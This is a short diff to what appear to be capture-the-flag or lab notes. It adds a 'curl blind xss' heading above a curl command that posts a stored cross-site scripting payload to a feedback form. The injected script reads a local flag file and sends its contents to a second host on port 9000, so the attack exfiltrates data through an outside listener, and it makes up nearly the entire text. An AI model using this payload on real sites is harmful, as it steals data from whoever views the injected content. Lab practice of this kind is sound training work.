@@ -1,3 +1,5 @@
+# curl blind xss
+
 curl -X POST http://10.10.59.111:8080/submit_feedback -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: http://10.10.59.111:8080" -H "Referer: http://10.10.59.111:8080/submit_feedback" --data-urlencode "feedback=<script>fetch('http://127.0.0.1:8080/flag.txt').then(response => response.text()).then(data => {fetch('http://10.8.136.212:9000?flag=' + encodeURIComponent(data));});</script>"
 
 ### ✅ `--data-urlencode` (자동 인코딩됨)
